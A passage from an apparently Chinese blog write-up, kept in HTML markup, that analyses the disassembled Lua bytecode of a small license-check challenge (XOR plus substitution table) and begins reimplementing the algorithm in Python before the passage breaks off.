K92       ; R4 :&#x3D; 198</span><br><span class="line">  110 [-]: LOADK     R5 K93       ; R5 :&#x3D; 228</span><br><span class="line">  111 [-]: LOADK     R6 K4        ; R6 :&#x3D; 95</span><br><span class="line">  112 [-]: LOADK     R7 K94       ; R7 :&#x3D; 10</span><br><span class="line">  113 [-]: LOADK     R8 K95       ; R8 :&#x3D; 78</span><br><span class="line">  114 [-]: LOADK     R9 K28       ; R9 :&#x3D; 37</span><br><span class="line">  115 [-]: LOADK     R10 K22      ; R10 :&#x3D; 121</span><br><span class="line">  116 [-]: LOADK     R11 K96      ; R11 :&#x3D; 236</span><br><span class="line">  117 [-]: LOADK     R12 K97      ; R12 :&#x3D; 59</span><br><span class="line">  118 [-]: LOADK     R13 K3       ; R13 :&#x3D; 60</span><br><span class="line">  119 [-]: LOADK     R14 K98      ; R14 :&#x3D; 91</span><br><span class="line">  120 [-]: LOADK     R15 K99      ; R15 :&#x3D; 146</span><br><span class="line">  121 [-]: LOADK     R16 K100     ; R16 :&#x3D; 46</span><br><span class="line">  122 [-]: LOADK     R17 K101     ; R17 :&#x3D; 77</span><br><span class="line">  123 [-]: LOADK     R18 K102     ; R18 :&#x3D; 218</span><br><span class="line">  124 [-]: LOADK     R19 K103     ; R19 :&#x3D; 66</span><br><span class="line">  125 [-]: LOADK     R20 K104     ; R20 :&#x3D; 200</span><br><span class="line">  126 [-]: LOADK     R21 K105     ; R21 :&#x3D; 61</span><br><span class="line">  127 [-]: LOADK     R22 K106     ; R22 :&#x3D; 241</span><br><span class="line">  128 [-]: LOADK     R23 K107     ; R23 :&#x3D; 70</span><br><span class="line">  129 [-]: LOADK     R24 K40      ; R24 :&#x3D; 55</span><br><span class="line">  130 [-]: LOADK     R25 K108     ; R25 :&#x3D; 39</span><br><span class="line">  131 [-]: LOADK     R26 K109     ; R26 :&#x3D; 227</span><br><span class="line">  132 [-]: LOADK     R27 K43      ; R27 :&#x3D; 42</span><br><span class="line">  133 [-]: LOADK     R28 K110     ; R28 :&#x3D; 2</span><br><span class="line">  134 [-]: LOADK     R29 K111     ; R29 :&#x3D; 231</span><br><span class="line">  135 [-]: LOADK     R30 K112     ; R30 :&#x3D; 235</span><br><span class="line">  136 [-]: LOADK     R31 K113     ; R31 :&#x3D; 122</span><br><span class="line">  137 [-]: LOADK     R32 K114     ; R32 :&#x3D; 135</span><br><span class="line">  138 [-]: LOADK     R33 K115     ; R33 :&#x3D; 152</span><br><span class="line">  139 [-]: LOADK     R34 K116     ; R34 :&#x3D; 137</span><br><span class="line">  140 [-]: LOADK     R35 K117     ; R35 :&#x3D; 173</span><br><span class="line">  141 [-]: LOADK     R36 K118     ; R36 :&#x3D; 232</span><br><span class="line">  142 [-]: LOADK     R37 K119     ; R37 :&#x3D; 101</span><br><span class="line">  143 [-]: LOADK     R38 K120     ; R38 :&#x3D; 75</span><br><span class="line">  144 [-]: LOADK     R39 K38      ; R39 :&#x3D; 233</span><br><span class="line">  145 [-]: LOADK     R40 K121     ; R40 :&#x3D; 21</span><br><span class="line">  146 [-]: LOADK     R41 K44      ; R41 :&#x3D; 252</span><br><span class="line">  147 [-]: LOADK     R42 K30      ; R42 :&#x3D; 15</span><br><span class="line">  148 [-]: LOADK     R43 K33      ; R43 :&#x3D; 133</span><br><span class="line">  149 [-]: LOADK     R44 K122     ; R44 :&#x3D; 111</span><br><span class="line">  150 [-]: LOADK     R45 K123     ; R45 :&#x3D; 205</span><br><span class="line">  151 [-]: LOADK     R46 K27      ; R46 :&#x3D; 57</span><br><span class="line">  152 [-]: LOADK     R47 K124     ; R47 :&#x3D; 132</span><br><span class="line">  153 [-]: LOADK     R48 K125     ; R48 :&#x3D; 187</span><br><span class="line">  154 [-]: LOADK     R49 K126     ; R49 :&#x3D; 96</span><br><span class="line">  155 [-]: LOADK     R50 K7       ; R50 :&#x3D; 49</span><br><span class="line">  156 [-]: LOADK     R51 K127     ; R51 :&#x3D; 124</span><br><span class="line">  157 [-]: LOADK     R52 K128     ; R52 :&#x3D; 86</span><br><span class="line">  158 [-]: (null)    R2 50 2      ; R2[50] to R2[99] :&#x3D; R3 to R52 ; R(a)[(c-1)*FPF+i] :&#x3D; R(a+i), 1 &lt;&#x3D; i &lt;&#x3D; b, a&#x3D;2, b&#x3D;50, c&#x3D;2, FPF&#x3D;50</span><br><span class="line">  159 [-]: LOADK     R3 K129      ; R3 :&#x3D; 19</span><br><span class="line">  160 [-]: LOADK     R4 K130      ; R4 :&#x3D; 188</span><br><span class="line">  161 [-]: LOADK     R5 K131      ; R5 :&#x3D; 80</span><br><span class="line">  162 [-]: LOADK     R6 K132      ; R6 :&#x3D; 213</span><br><span class="line">  163 [-]: LOADK     R7 K133      ; R7 :&#x3D; 106</span><br><span class="line">  164 [-]: LOADK     R8 K134      ; R8 :&#x3D; 214</span><br><span class="line">  165 [-]: LOADK     R9 K135      ; R9 :&#x3D; 203</span><br><span class="line">  166 [-]: LOADK     R10 K136     ; R10 :&#x3D; 177</span><br><span class="line">  167 [-]: LOADK     R11 K137     ; R11 :&#x3D; 56</span><br><span class="line">  168 [-]: LOADK     R12 K138     ; R12 :&#x3D; 104</span><br><span class="line">  169 [-]: LOADK     R13 K139     ; R13 :&#x3D; 82</span><br><span class="line">  170 [-]: LOADK     R14 K29      ; R14 :&#x3D; 110</span><br><span class="line">  171 [-]: LOADK     R15 K140     ; R15 :&#x3D; 196</span><br><span class="line">  172 [-]: LOADK     R16 K141     ; R16 :&#x3D; 113</span><br><span class="line">  173 [-]: LOADK     R17 K142     ; R17 :&#x3D; 155</span><br><span class="line">  174 [-]: LOADK     R18 K143     ; R18 :&#x3D; 170</span><br><span class="line">  175 [-]: LOADK     R19 K144     ; R19 :&#x3D; 150</span><br><span class="line">  176 [-]: LOADK     R20 K26      ; R20 :&#x3D; 117</span><br><span class="line">  177 [-]: LOADK     R21 K145     ; R21 :&#x3D; 26</span><br><span class="line">  178 [-]: LOADK     R22 K146     ; R22 :&#x3D; 140</span><br><span class="line">  179 [-]: LOADK     R23 K147     ; R23 :&#x3D; 144</span><br><span class="line">  180 [-]: LOADK     R24 K148     ; R24 :&#x3D; 11</span><br><span class="line">  181 [-]: LOADK     R25 K1       ; R25 :&#x3D; 172</span><br><span class="line">  182 [-]: LOADK     R26 K149     ; R26 :&#x3D; 67</span><br><span class="line">  183 [-]: LOADK     R27 K150     ; R27 :&#x3D; 209</span><br><span class="line">  184 [-]: LOADK     R28 K151     ; R28 :&#x3D; 125</span><br><span class="line">  185 [-]: LOADK     R29 K23      ; R29 :&#x3D; 54</span><br><span class="line">  186 [-]: LOADK     R30 K8       ; R30 :&#x3D; 58</span><br><span class="line">  187 [-]: LOADK     R31 K37      ; R31 :&#x3D; 128</span><br><span class="line">  188 [-]: LOADK     R32 K152     ; R32 :&#x3D; 204</span><br><span class="line">  189 [-]: LOADK     R33 K153     ; R33 :&#x3D; 186</span><br><span class="line">  190 [-]: LOADK     R34 K154     ; R34 :&#x3D; 199</span><br><span class="line">  191 [-]: LOADK     R35 K155     ; R35 :&#x3D; 189</span><br><span class="line">  192 [-]: LOADK     R36 K156     ; R36 :&#x3D; 208</span><br><span class="line">  193 [-]: LOADK     R37 K157     ; R37 :&#x3D; 239</span><br><span class="line">  194 [-]: LOADK     R38 K158     ; R38 :&#x3D; 143</span><br><span class="line">  195 [-]: LOADK     R39 K159     ; R39 :&#x3D; 249</span><br><span class="line">  196 [-]: LOADK     R40 K13      ; R40 :&#x3D; 246</span><br><span class="line">  197 [-]: LOADK     R41 K160     ; R41 :&#x3D; 1</span><br><span class="line">  198 [-]: LOADK     R42 K161     ; R42 :&#x3D; 139</span><br><span class="line">  199 [-]: LOADK     R43 K162     ; R43 :&#x3D; 33</span><br><span class="line">  200 [-]: LOADK     R44 K12      ; R44 :&#x3D; 87</span><br><span class="line">  201 [-]: LOADK     R45 K163     ; R45 :&#x3D; 64</span><br><span class="line">  202 [-]: LOADK     R46 K45      ; R46 :&#x3D; 116</span><br><span class="line">  203 [-]: LOADK     R47 K164     ; R47 :&#x3D; 84</span><br><span class="line">  204 [-]: LOADK     R48 K165     ; R48 :&#x3D; 254</span><br><span class="line">  205 [-]: LOADK     R49 K166     ; R49 :&#x3D; 126</span><br><span class="line">  206 [-]: LOADK     R50 K167     ; R50 :&#x3D; 202</span><br><span class="line">  207 [-]: LOADK     R51 K168     ; R51 :&#x3D; 148</span><br><span class="line">  208 [-]: LOADK     R52 K169     ; R52 :&#x3D; 76</span><br><span class="line">  209 [-]: (null)    R2 50 3      ; R2[100] to R2[149] :&#x3D; R3 to R52 ; R(a)[(c-1)*FPF+i] :&#x3D; R(a+i), 1 &lt;&#x3D; i &lt;&#x3D; b, a&#x3D;2, b&#x3D;50, c&#x3D;3, FPF&#x3D;50</span><br><span class="line">  210 [-]: LOADK     R3 K170      ; R3 :&#x3D; 247</span><br><span class="line">  211 [-]: LOADK     R4 K171      ; R4 :&#x3D; 115</span><br><span class="line">  212 [-]: LOADK     R5 K172      ; R5 :&#x3D; 109</span><br><span class="line">  213 [-]: LOADK     R6 K173      ; R6 :&#x3D; 3</span><br><span class="line">  214 [-]: LOADK     R7 K174      ; R7 :&#x3D; 238</span><br><span class="line">  215 [-]: LOADK     R8 K175      ; R8 :&#x3D; 114</span><br><span class="line">  216 [-]: LOADK     R9 K176      ; R9 :&#x3D; 156</span><br><span class="line">  217 [-]: LOADK     R10 K177     ; R10 :&#x3D; 195</span><br><span class="line">  218 [-]: LOADK     R11 K32      ; R11 :&#x3D; 163</span><br><span class="line">  219 [-]: LOADK     R12 K18      ; R12 :&#x3D; 159</span><br><span class="line">  220 [-]: LOADK     R13 K178     ; R13 :&#x3D; 52</span><br><span class="line">  221 [-]: LOADK     R14 K179     ; R14 :&#x3D; 36</span><br><span class="line">  222 [-]: LOADK     R15 K180     ; R15 :&#x3D; 245</span><br><span class="line">  223 [-]: LOADK     R16 K181     ; R16 :&#x3D; 240</span><br><span class="line">  224 [-]: LOADK     R17 K182     ; R17 :&#x3D; 63</span><br><span class="line">  225 [-]: LOADK     R18 K183     ; R18 :&#x3D; 153</span><br><span class="line">  226 [-]: LOADK     R19 K184     ; R19 :&#x3D; 166</span><br><span class="line">  227 [-]: LOADK     R20 K185     ; R20 :&#x3D; 167</span><br><span class="line">  228 [-]: LOADK     R21 K186     ; R21 :&#x3D; 175</span><br><span class="line">  229 [-]: LOADK     R22 K187     ; R22 :&#x3D; 9</span><br><span class="line">  230 [-]: LOADK     R23 K188     ; R23 :&#x3D; 151</span><br><span class="line">  231 [-]: LOADK     R24 K9       ; R24 :&#x3D; 171</span><br><span class="line">  232 [-]: LOADK     R25 K189     ; R25 :&#x3D; 216</span><br><span class="line">  233 [-]: LOADK     R26 K190     ; R26 :&#x3D; 207</span><br><span class="line">  234 [-]: LOADK     R27 K191     ; R27 :&#x3D; 179</span><br><span class="line">  235 [-]: LOADK     R28 K192     ; R28 :&#x3D; 72</span><br><span class="line">  236 [-]: LOADK     R29 K193     ; R29 :&#x3D; 176</span><br><span class="line">  237 [-]: LOADK     R30 K194     ; R30 :&#x3D; 48</span><br><span class="line">  238 [-]: LOADK     R31 K195     ; R31 :&#x3D; 178</span><br><span class="line">  239 [-]: LOADK     R32 K20      ; R32 :&#x3D; 157</span><br><span class="line">  240 [-]: LOADK     R33 K196     ; R33 :&#x3D; 20</span><br><span class="line">  241 [-]: LOADK     R34 K39      ; R34 :&#x3D; 181</span><br><span class="line">  242 [-]: LOADK     R35 K197     ; R35 :&#x3D; 149</span><br><span class="line">  243 [-]: LOADK     R36 K198     ; R36 :&#x3D; 53</span><br><span class="line">  244 [-]: LOADK     R37 K199     ; R37 :&#x3D; 184</span><br><span class="line">  245 [-]: LOADK     R38 K200     ; R38 :&#x3D; 4</span><br><span class="line">  246 [-]: LOADK     R39 K201     ; R39 :&#x3D; 136</span><br><span class="line">  247 [-]: LOADK     R40 K202     ; R40 :&#x3D; 165</span><br><span class="line">  248 [-]: LOADK     R41 K203     ; R41 :&#x3D; 217</span><br><span class="line">  249 [-]: LOADK     R42 K204     ; R42 :&#x3D; 50</span><br><span class="line">  250 [-]: LOADK     R43 K205     ; R43 :&#x3D; 190</span><br><span class="line">  251 [-]: LOADK     R44 K206     ; R44 :&#x3D; 191</span><br><span class="line">  252 [-]: LOADK     R45 K207     ; R45 :&#x3D; 192</span><br><span class="line">  253 [-]: LOADK     R46 K208     ; R46 :&#x3D; 193</span><br><span class="line">  254 [-]: LOADK     R47 K209     ; R47 :&#x3D; 98</span><br><span class="line">  255 [-]: LOADK     R48 K210     ; R48 :&#x3D; 215</span><br><span class="line">  256 [-]: LOADK     R49 K42      ; R49 :&#x3D; 62</span><br><span class="line">  257 [-]: LOADK     R50 K211     ; R50 :&#x3D; 112</span><br><span class="line">  258 [-]: LOADK     R51 K212     ; R51 :&#x3D; 38</span><br><span class="line">  259 [-]: LOADK     R52 K213     ; R52 :&#x3D; 90</span><br><span class="line">  260 [-]: (null)    R2 50 4      ; R2[150] to R2[199] :&#x3D; R3 to R52 ; R(a)[(c-1)*FPF+i] :&#x3D; R(a+i), 1 &lt;&#x3D; i &lt;&#x3D; b, a&#x3D;2, b&#x3D;50, c&#x3D;4, FPF&#x3D;50</span><br><span class="line">  261 [-]: LOADK     R3 K214      ; R3 :&#x3D; 123</span><br><span class="line">  262 [-]: LOADK     R4 K215      ; R4 :&#x3D; 105</span><br><span class="line">  263 [-]: LOADK     R5 K25       ; R5 :&#x3D; 94</span><br><span class="line">  264 [-]: LOADK     R6 K216      ; R6 :&#x3D; 221</span><br><span class="line">  265 [-]: LOADK     R7 K34       ; R7 :&#x3D; 99</span><br><span class="line">  266 [-]: LOADK     R8 K217      ; R8 :&#x3D; 201</span><br><span class="line">  267 [-]: LOADK     R9 K218      ; R9 :&#x3D; 206</span><br><span class="line">  268 [-]: LOADK     R10 K219     ; R10 :&#x3D; 251</span><br><span class="line">  269 [-]: LOADK     R11 K220     ; R11 :&#x3D; 14</span><br><span class="line">  270 [-]: LOADK     R12 K221     ; R12 :&#x3D; 211</span><br><span class="line">  271 [-]: LOADK     R13 K222     ; R13 :&#x3D; 220</span><br><span class="line">  272 [-]: LOADK     R14 K223     ; R14 :&#x3D; 131</span><br><span class="line">  273 [-]: LOADK     R15 K224     ; R15 :&#x3D; 212</span><br><span class="line">  274 [-]: LOADK     R16 K225     ; R16 :&#x3D; 130</span><br><span class="line">  275 [-]: LOADK     R17 K226     ; R17 :&#x3D; 134</span><br><span class="line">  276 [-]: LOADK     R18 K10      ; R18 :&#x3D; 253</span><br><span class="line">  277 [-]: LOADK     R19 K227     ; R19 :&#x3D; 120</span><br><span class="line">  278 [-]: LOADK     R20 K228     ; R20 :&#x3D; 145</span><br><span class="line">  279 [-]: LOADK     R21 K229     ; R21 :&#x3D; 18</span><br><span class="line">  280 [-]: LOADK     R22 K230     ; R22 :&#x3D; 219</span><br><span class="line">  281 [-]: LOADK     R23 K231     ; R23 :&#x3D; 79</span><br><span class="line">  282 [-]: LOADK     R24 K232     ; R24 :&#x3D; 129</span><br><span class="line">  283 [-]: LOADK     R25 K15      ; R25 :&#x3D; 12</span><br><span class="line">  284 [-]: LOADK     R26 K233     ; R26 :&#x3D; 93</span><br><span class="line">  285 [-]: LOADK     R27 K5       ; R27 :&#x3D; 5</span><br><span class="line">  286 [-]: LOADK     R28 K234     ; R28 :&#x3D; 183</span><br><span class="line">  287 [-]: LOADK     R29 K235     ; R29 :&#x3D; 107</span><br><span class="line">  288 [-]: LOADK     R30 K236     ; R30 :&#x3D; 71</span><br><span class="line">  289 [-]: LOADK     R31 K237     ; R31 :&#x3D; 226</span><br><span class="line">  290 [-]: LOADK     R32 K238     ; R32 :&#x3D; 180</span><br><span class="line">  291 [-]: LOADK     R33 K239     ; R33 :&#x3D; 24</span><br><span class="line">  292 [-]: LOADK     R34 K17      ; R34 :&#x3D; 234</span><br><span class="line">  293 [-]: LOADK     R35 K240     ; R35 :&#x3D; 7</span><br><span class="line">  294 [-]: LOADK     R36 K241     ; R36 :&#x3D; 108</span><br><span class="line">  295 [-]: LOADK     R37 K242     ; R37 :&#x3D; 174</span><br><span class="line">  296 [-]: LOADK     R38 K243     ; R38 :&#x3D; 6</span><br><span class="line">  297 [-]: LOADK     R39 K11      ; R39 :&#x3D; 45</span><br><span class="line">  298 [-]: LOADK     R40 K244     ; R40 :&#x3D; 29</span><br><span class="line">  299 [-]: LOADK     R41 K245     ; R41 :&#x3D; 32</span><br><span class="line">  300 [-]: LOADK     R42 K246     ; R42 :&#x3D; 168</span><br><span class="line">  301 [-]: LOADK     R43 K41      ; R43 :&#x3D; 230</span><br><span class="line">  302 [-]: LOADK     R44 K14      ; R44 :&#x3D; 197</span><br><span class="line">  303 [-]: LOADK     R45 K247     ; R45 :&#x3D; 41</span><br><span class="line">  304 [-]: LOADK     R46 K2       ; R46 :&#x3D; 25</span><br><span class="line">  305 [-]: LOADK     R47 K248     ; R47 :&#x3D; 255</span><br><span class="line">  306 [-]: LOADK     R48 K249     ; R48 :&#x3D; 164</span><br><span class="line">  307 [-]: LOADK     R49 K6       ; R49 :&#x3D; 27</span><br><span class="line">  308 [-]: LOADK     R50 K250     ; R50 :&#x3D; 210</span><br><span class="line">  309 [-]: LOADK     R51 K251     ; R51 :&#x3D; 248</span><br><span class="line">  310 [-]: LOADK     R52 K16      ; R52 :&#x3D; 97</span><br><span class="line">  311 [-]: (null)    R2 50 5      ; R2[200] to R2[249] :&#x3D; R3 to R52 ; R(a)[(c-1)*FPF+i] :&#x3D; R(a+i), 1 &lt;&#x3D; i &lt;&#x3D; b, a&#x3D;2, b&#x3D;50, c&#x3D;5, FPF&#x3D;50</span><br><span class="line">  312 [-]: LOADK     R3 K252      ; R3 :&#x3D; 250</span><br><span class="line">  313 [-]: LOADK     R4 K253      ; R4 :&#x3D; 22</span><br><span class="line">  314 [-]: LOADK     R5 K24       ; R5 :&#x3D; 242</span><br><span class="line">  315 [-]: LOADK     R6 K254      ; R6 :&#x3D; 243</span><br><span class="line">  316 [-]: LOADK     R7 K255      ; R7 :&#x3D; 30</span><br><span class="line">  317 [-]: LOADK     R8 K256      ; R8 :&#x3D; 69</span><br><span class="line">  318 [-]: (null)    R2 6 6       ; R2[250] to R2[255] :&#x3D; R3 to R8 ; R(a)[(c-1)*FPF+i] :&#x3D; R(a+i), 1 &lt;&#x3D; i &lt;&#x3D; b, a&#x3D;2, b&#x3D;6, c&#x3D;6, FPF&#x3D;50</span><br><span class="line">  319 [-]: LOADK     R3 K257      ; R3 :&#x3D; &quot;encrypt&quot;</span><br><span class="line">  320 [-]: __eq      R4 1         ; R4 :&#x3D; closure(Function #0_1)</span><br><span class="line">  321 [-]: SETTABUP  U0 R3 R4     ; U0[R3] :&#x3D; R4</span><br><span class="line">  322 [-]: LOADK     R3 K258      ; R3 :&#x3D; &quot;check_license&quot;</span><br><span class="line">  323 [-]: __eq      R4 2         ; R4 :&#x3D; closure(Function #0_2)</span><br><span class="line">  324 [-]: SETTABUP  U0 R3 R4     ; U0[R3] :&#x3D; R4</span><br><span class="line">  325 [-]: LOADK     R3 K259      ; R3 :&#x3D; &quot;io&quot;</span><br><span class="line">  326 [-]: GETTABUP  R3 U0 R3     ; R3 :&#x3D; U0[R3]</span><br><span class="line">  327 [-]: LOADK     R4 K260      ; R4 :&#x3D; &quot;write&quot;</span><br><span class="line">  328 [-]: GETTABLE  R3 R3 R4     ; R3 :&#x3D; R3[R4]</span><br><span class="line">  329 [-]: LOADK     R4 K261      ; R4 :&#x3D; &quot;input: &quot;</span><br><span class="line">  330 [-]: CALL      R3 2 1       ;  :&#x3D; R3(R4)</span><br><span class="line">  331 [-]: LOADK     R3 K262      ; R3 :&#x3D; &quot;license&quot;</span><br><span class="line">  332 [-]: LOADK     R4 K259      ; R4 :&#x3D; &quot;io&quot;</span><br><span class="line">  333 [-]: GETTABUP  R4 U0 R4     ; R4 :&#x3D; U0[R4]</span><br><span class="line">  334 [-]: LOADK     R5 K263      ; R5 :&#x3D; &quot;read&quot;</span><br><span class="line">  335 [-]: GETTABLE  R4 R4 R5     ; R4 :&#x3D; R4[R5]</span><br><span class="line">  336 [-]: LOADK     R5 K264      ; R5 :&#x3D; &quot;*l&quot;</span><br><span class="line">  337 [-]: CALL      R4 2 2       ; R4 :&#x3D; R4(R5)</span><br><span class="line">  338 [-]: SETTABUP  U0 R3 R4     ; U0[R3] :&#x3D; R4</span><br><span class="line">  339 [-]: LOADK     R3 K258      ; R3 :&#x3D; &quot;check_license&quot;</span><br><span class="line">  340 [-]: GETTABUP  R3 U0 R3     ; R3 :&#x3D; U0[R3]</span><br><span class="line">  341 [-]: LOADK     R4 K262      ; R4 :&#x3D; &quot;license&quot;</span><br><span class="line">  342 [-]: GETTABUP  R4 U0 R4     ; R4 :&#x3D; U0[R4]</span><br><span class="line">  343 [-]: CALL      R3 2 1       ;  :&#x3D; R3(R4)</span><br><span class="line">  344 [-]: RETURN    R0 1         ; return </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">; Function:        0_0</span><br><span class="line">; Defined at line: 2</span><br><span class="line">; #Upvalues:       1</span><br><span class="line">; #Parameters:     1</span><br><span class="line">; Is_vararg:       0</span><br><span class="line">; Max Stack Size:  10</span><br><span class="line"></span><br><span class="line">    0 [-]: NEWTABLE  R1 0 0       ; R1 :&#x3D; &#123;&#125; (size &#x3D; 0,0)</span><br><span class="line">    1 [-]: LOADK     R2 K0        ; R2 :&#x3D; 1</span><br><span class="line">    2 [-]: GETTABUP  R3 U0 K1     ; R3 :&#x3D; U0[&quot;string&quot;]</span><br><span class="line">    3 [-]: GETTABLE  R3 R3 K2     ; R3 :&#x3D; R3[&quot;len&quot;]</span><br><span class="line">    4 [-]: MOVE      R4 R0        ; R4 :&#x3D; R0</span><br><span class="line">    5 [-]: CALL      R3 2 2       ; R3 :&#x3D; R3(R4)</span><br><span class="line">    6 [-]: LOADK     R4 K0        ; R4 :&#x3D; 1</span><br><span class="line">    7 [-]: FORPREP   R2 8         ; R2 -&#x3D; R4; pc +&#x3D; 8 (goto 16)</span><br><span class="line">    8 [-]: LEN       R6 R1        ; R6 :&#x3D; #R1</span><br><span class="line">    9 [-]: ADD       R6 R6 K0     ; R6 :&#x3D; R6 + 1</span><br><span class="line">   10 [-]: GETTABUP  R7 U0 K1     ; R7 :&#x3D; U0[&quot;string&quot;]</span><br><span class="line">   11 [-]: GETTABLE  R7 R7 K3     ; R7 :&#x3D; R7[&quot;byte&quot;]</span><br><span class="line">   12 [-]: MOVE      R8 R0        ; R8 :&#x3D; R0</span><br><span class="line">   13 [-]: MOVE      R9 R5        ; R9 :&#x3D; R5</span><br><span class="line">   14 [-]: CALL      R7 3 2       ; R7 :&#x3D; R7(R8 to R9)</span><br><span class="line">   15 [-]: __mode    R1 R6 R7     ; R1[R6] :&#x3D; R7</span><br><span class="line">   16 [-]: (null)    R2 -9        ; R2 +&#x3D; R4; if R2 &lt;&#x3D; R3 then R5 :&#x3D; R2; PC +&#x3D; -9 , goto 8 end</span><br><span class="line">   17 [-]: RETURN    R1 2         ; return R1</span><br><span class="line">   18 [-]: RETURN    R0 1         ; return </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">; Function:        0_1</span><br><span class="line">; Defined at line: 15</span><br><span class="line">; #Upvalues:       4</span><br><span class="line">; #Parameters:     1</span><br><span class="line">; Is_vararg:       0</span><br><span class="line">; Max Stack Size:  10</span><br><span class="line"></span><br><span class="line">    0 [-]: GETTABUP  R1 U0 K0     ; R1 :&#x3D; U0[&quot;to_v&quot;]</span><br><span class="line">    1 [-]: MOVE      R2 R0        ; R2 :&#x3D; R0</span><br><span class="line">    2 [-]: CALL      R1 2 2       ; R1 :&#x3D; R1(R2)</span><br><span class="line">    3 [-]: NEWTABLE  R2 0 0       ; R2 :&#x3D; &#123;&#125; (size &#x3D; 0,0)</span><br><span class="line">    4 [-]: LOADK     R3 K1        ; R3 :&#x3D; 1</span><br><span class="line">    5 [-]: LEN       R4 R1        ; R4 :&#x3D; #R1</span><br><span class="line">    6 [-]: LOADK     R5 K1        ; R5 :&#x3D; 1</span><br><span class="line">    7 [-]: FORPREP   R3 10        ; R3 -&#x3D; R5; pc +&#x3D; 10 (goto 18)</span><br><span class="line">    8 [-]: GETTABLE  R7 R1 R6     ; R7 :&#x3D; R1[R6]</span><br><span class="line">    9 [-]: GETTABUP  R8 U1 R6     ; R8 :&#x3D; U1[R6]</span><br><span class="line">   10 [-]: BXOR      R7 R7 R8     ; R7 :&#x3D; R7 ~ R8</span><br><span class="line">   11 [-]: __mode    R1 R6 R7     ; R1[R6] :&#x3D; R7</span><br><span class="line">   12 [-]: LEN       R7 R2        ; R7 :&#x3D; #R2</span><br><span class="line">   13 [-]: ADD       R7 R7 K1     ; R7 :&#x3D; R7 + 1</span><br><span class="line">   14 [-]: GETTABLE  R8 R1 R6     ; R8 :&#x3D; R1[R6]</span><br><span class="line">   15 [-]: ADD       R8 R8 K1     ; R8 :&#x3D; R8 + 1</span><br><span class="line">   16 [-]: GETTABUP  R8 U2 R8     ; R8 :&#x3D; U2[R8]</span><br><span class="line">   17 [-]: __mode    R2 R7 R8     ; R2[R7] :&#x3D; R8</span><br><span class="line">   18 [-]: (null)    R3 -11       ; R3 +&#x3D; R5; if R3 &lt;&#x3D; R4 then R6 :&#x3D; R3; PC +&#x3D; -11 , goto 8 end</span><br><span class="line">   19 [-]: LOADK     R3 K2        ; R3 :&#x3D; 0</span><br><span class="line">   20 [-]: LOADK     R4 K1        ; R4 :&#x3D; 1</span><br><span class="line">   21 [-]: LEN       R5 R1        ; R5 :&#x3D; #R1</span><br><span class="line">   22 [-]: LOADK     R6 K1        ; R6 :&#x3D; 1</span><br><span class="line">   23 [-]: FORPREP   R4 7         ; R4 -&#x3D; R6; pc +&#x3D; 7 (goto 31)</span><br><span class="line">   24 [-]: GETTABLE  R8 R2 R7     ; R8 :&#x3D; R2[R7]</span><br><span class="line">   25 [-]: GETTABUP  R9 U3 R7     ; R9 :&#x3D; U3[R7]</span><br><span class="line">   26 [-]: __add     0 R8 R9      ; if R8 &#x3D;&#x3D; R9 then goto 28 else goto 30</span><br><span class="line">   27 [-]: JMP       R0 2         ; PC +&#x3D; 2 (goto 30)</span><br><span class="line">   28 [-]: ADD       R3 R3 K1     ; R3 :&#x3D; R3 + 1</span><br><span class="line">   29 [-]: JMP       R0 1         ; PC +&#x3D; 1 (goto 31)</span><br><span class="line">   30 [-]: ADD       R3 R3 K3     ; R3 :&#x3D; R3 + 2</span><br><span class="line">   31 [-]: (null)    R4 -8        ; R4 +&#x3D; R6; if R4 &lt;&#x3D; R5 then R7 :&#x3D; R4; PC +&#x3D; -8 , goto 24 end</span><br><span class="line">   32 [-]: LEN       R4 R1        ; R4 :&#x3D; #R1</span><br><span class="line">   33 [-]: __add     1 R3 R4      ; if R3 ~&#x3D; R4 then goto 35 else goto 39</span><br><span class="line">   34 [-]: JMP       R0 4         ; PC +&#x3D; 4 (goto 39)</span><br><span class="line">   35 [-]: GETTABUP  R4 U0 K4     ; R4 :&#x3D; U0[&quot;print&quot;]</span><br><span class="line">   36 [-]: LOADK     R5 K5        ; R5 :&#x3D; &quot;bad&quot;</span><br><span class="line">   37 [-]: CALL      R4 2 1       ;  :&#x3D; R4(R5)</span><br><span class="line">   38 [-]: JMP       R0 3         ; PC +&#x3D; 3 (goto 42)</span><br><span class="line">   39 [-]: GETTABUP  R4 U0 K4     ; R4 :&#x3D; U0[&quot;print&quot;]</span><br><span class="line">   40 [-]: LOADK     R5 K6        ; R5 :&#x3D; &quot;good&quot;</span><br><span class="line">   41 [-]: CALL      R4 2 1       ;  :&#x3D; R4(R5)</span><br><span class="line">   42 [-]: RETURN    R0 1         ; return </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">; Function:        0_2</span><br><span class="line">; Defined at line: 38</span><br><span class="line">; #Upvalues:       1</span><br><span class="line">; #Parameters:     1</span><br><span class="line">; Is_vararg:       0</span><br><span class="line">; Max Stack Size:  3</span><br><span class="line"></span><br><span class="line">    0 [-]: LEN       R1 R0        ; R1 :&#x3D; #R0</span><br><span class="line">    1 [-]: SETTABUP  U0 K0 R1     ; U0[&quot;size&quot;] :&#x3D; R1</span><br><span class="line">    2 [-]: GETTABUP  R1 U0 K0     ; R1 :&#x3D; U0[&quot;size&quot;]</span><br><span class="line">    3 [-]: __add     1 R1 K1      ; if R1 ~&#x3D; 25 then goto 5 else goto 9</span><br><span class="line">    4 [-]: JMP       R0 4         ; PC +&#x3D; 4 (goto 9)</span><br><span class="line">    5 [-]: GETTABUP  R1 U0 K2     ; R1 :&#x3D; U0[&quot;print&quot;]</span><br><span class="line">    6 [-]: LOADK     R2 K3        ; R2 :&#x3D; &quot;length error&quot;</span><br><span class="line">    7 [-]: CALL      R1 2 1       ;  :&#x3D; R1(R2)</span><br><span class="line">    8 [-]: RETURN    R0 1         ; return </span><br><span class="line">    9 [-]: GETTABUP  R1 U0 K4     ; R1 :&#x3D; U0[&quot;encrypt&quot;]</span><br><span class="line">   10 [-]: MOVE      R2 R0        ; R2 :&#x3D; R0</span><br><span class="line">   11 [-]: CALL      R1 2 1       ;  :&#x3D; R1(R2)</span><br><span class="line">   12 [-]: RETURN    R0 1         ; return </span><br></pre></td></tr></table></figure><p>说是反汇编其实还是有一点反编译注释的吼。</p><p>根据注释来走就很容易理顺逻辑啦（可以参考<a href="https://www.mdeditor.tw/pl/pPTs">深入理解 Lua 虚拟机_腾讯技术工程 - MdEditor</a>），算法用python还原是：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 